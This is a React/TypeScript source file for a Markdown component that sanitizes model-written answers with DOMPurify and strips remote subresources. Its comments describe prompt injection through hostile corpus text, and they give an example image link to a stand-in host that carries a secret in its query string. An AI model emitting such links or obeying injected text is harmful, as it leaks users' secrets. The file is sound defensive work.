/**
 * Markdown — renders model-authored markdown as sanitized HTML (pp6q.1.1).
 *
 * Answers are LLM output, so this is a genuine XSS surface: the model can be
 * steered into emitting a <script> tag or a javascript: link by hostile corpus
 * text or a crafted prompt. Everything rendered here goes through DOMPurify
 * first, and the vector list in Markdown.test.tsx is the regression suite that
 * keeps it that way.
 *
 * Why `marked` + `dompurify` (3 packages) over `react-markdown` + `remark-gfm`
 * (95, measured): ui/ has three runtime dependencies by design and the repo
 * carries an advisory backlog, so 95 transitive packages for prose formatting
 * is a poor trade. The cost is that we render an HTML string, which means
 * `dangerouslySetInnerHTML` over sanitized output — the standard, audited path
 * rather than a hand-rolled one, but it does make sanitization *our*
 * correctness obligation. Hence the tests.
 *
 * If a later phase needs per-node React components (e.g. turning inline [1]
 * citations into controls that scroll to SourceList), that is the one thing
 * `react-markdown` buys that CSS cannot — revisit then, not before.
 *
 * Sanitizing is not the whole story: DOMPurify keeps a remote `<img>`, which is
 * an exfiltration channel for a model steered by hostile text. The Workbench
 * closes it with `noRemoteSubresources` (decision X-10); today's chat channels
 * render exactly as they did, and the app-wide CSP is tracked separately as
 * agent-forge-harness-va8.
 */

import * as React from 'react'
import { marked } from 'marked'
import DOMPurify from 'dompurify'
import './Markdown.css'

export interface MarkdownProps {
  /** Markdown source. Treated as untrusted. */
  source: string
  className?: string
  /**
   * Decision X-10 — opt-in, and off for today's chat channels so their
   * behaviour is unchanged. When on, nothing rendered here may fetch anything
   * by itself: an image survives only as a reference to a campaign asset this
   * origin serves, every other subresource element and attribute is dropped,
   * and a `style` carrying `url()` loses the attribute. Links are untouched — a
   * link is a navigation the reader chooses, not a subresource the page loads.
   *
   * The Workbench turns it on because a model steered by injected corpus text
   * can emit `![](https://host/?d=<secret>)`, and this component would
   * otherwise fetch it (AE-66).
   */
  noRemoteSubresources?: boolean
}

/** Elements that fetch something of their own accord. */
const SUBRESOURCE_ELEMENTS = 'iframe, frame, frameset, object, embed, video, audio, source, track, link, style, svg, portal'

/** Attributes that name a subresource. `src` is handled separately: an `img` may keep one. */
const SUBRESOURCE_ATTRIBUTES = ['srcset', 'poster', 'background', 'data', 'lowsrc']

/**
 * The one route a GM surface may load an image from: the campaign asset route of
 * the media decision (MS-7, `GET /campaigns/{campaign_id}/assets/{asset_id}`).
 * "Same origin" alone is too wide — every GET this service answers would become
 * something a steered model can make the GM's browser request — so the path is
 * pinned and a query or fragment, which could carry text out, is refused.
 */
const CAMPAIGN_ASSET_PATH = /^\/campaigns\/[^/]+\/assets\/[^/]+$/

/**
 * True for a reference to a campaign asset on this page's own origin. False for
 * a remote host, a protocol-relative `//host` (whose origin differs), `data:`,
 * `blob:` and `javascript:` (none of which has this origin), and for any other
 * same-origin path.
 */
function isAssetReference(value: string | null): boolean {
  if (value === null || value === '') return false
  try {
    const url = new URL(value, document.baseURI)
    return (
      url.origin === window.location.origin
      && CAMPAIGN_ASSET_PATH.test(url.pathname)
      && url.search === ''
      && url.hash === ''
    )
  } catch {
    return false
  }
}

/** X-10, applied to already-sanitized DOM — in a document that cannot fetch (see `renderMarkdown`). */
function stripRemoteSubresources(host: HTMLElement): void {
  for (const element of host.querySelectorAll(SUBRESOURCE_ELEMENTS)) element.remove()
  for (const element of host.querySelectorAll('*')) {
    for (const name of SUBRESOURCE_ATTRIBUTES) element.removeAttribute(name)
    if (element.tagName !== 'IMG') element.removeAttribute('src')
    const style = element.getAttribute('style')
    if (style !== null && style.toLowerCase().includes('url(')) element.removeAttribute('style')
  }
  // An image is kept only when it points at a campaign asset this origin serves;
  // there is no half-measure, because an <img> with a stripped src is a broken icon.
  for (const image of host.querySelectorAll('img')) {
    if (!isAssetReference(image.getAttribute('src'))) image.remove()
  }
}

/**
 * Parse + sanitize. `marked` ships GFM (tables, strikethrough) with no plugin,
 * so nothing extra is configured here.
 *
 * `async: false` pins the synchronous overload — marked's return type is
 * `string | Promise<string>` and rendering needs the string.
 *
 * Deliberately NOT exported: a non-component export here breaks React Fast
 * Refresh (`react-refresh/only-export-components`), and nothing outside needs
 * it — the tests exercise the real pipeline through <Markdown/>. If a caller
 * ever does need the pure function, move it to its own module rather than
 * re-exporting it from here.
 */
function renderMarkdown(source: string, noRemoteSubresources: boolean): string {
  const raw = marked.parse(source, { async: false, gfm: true, breaks: true })
  const clean = DOMPurify.sanitize(raw)
  if (!noRemoteSubresources) return clean
  // The X-10 pass reads attributes through the DOM rather than a regex, and it
  // must do so in an INERT document. An <img> starts loading the moment it is
  // created in, or adopted by, a document with a browsing context — attached to
  // the page or not — so stripping nodes of the live document (which is where
  // DOMPurify's RETURN_DOM_FRAGMENT puts them) would strip after the request
  // had already left. A document from `createHTMLDocument` fetches nothing.
  const inert = document.implementation.createHTMLDocument('')
  inert.body.innerHTML = clean
  stripRemoteSubresources(inert.body)
  return inert.body.innerHTML
}

export function Markdown({ source, className, noRemoteSubresources = false }: MarkdownProps): React.JSX.Element {
  // Recomputed only when the source changes: sanitizing is not free and an
  // assistant answer re-renders on every unrelated ChatPane state change.
  const html = React.useMemo(() => renderMarkdown(source, noRemoteSubresources), [source, noRemoteSubresources])
  return (
    <div
      className={['aether-markdown', className].filter(Boolean).join(' ')}
      // Safe by construction: `html` is DOMPurify output, never raw model text.
      dangerouslySetInnerHTML={{ __html: html }}
    />
  )
}
